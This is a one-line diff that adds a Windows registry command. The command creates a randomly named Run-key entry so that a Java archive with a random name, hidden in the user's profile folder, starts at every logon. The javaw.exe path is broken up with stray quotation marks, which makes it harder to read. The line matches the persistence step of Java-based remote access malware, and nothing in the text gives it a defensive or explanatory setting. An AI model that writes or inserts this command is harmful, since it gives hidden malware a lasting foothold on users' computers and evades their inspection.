@@ -1,0 +1,1 @@
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v cRwUMdaPVwP /t REG_EXPAND_SZ /d "\"\App"Dat"a\Ro"ami"ng\Or"ac"le\bin\ja"vaw.ex"e \" -jar \"%USERPROFILE%\sgazsBZvxHC\GKPKtwfspIg.ddKgDj\"" /f
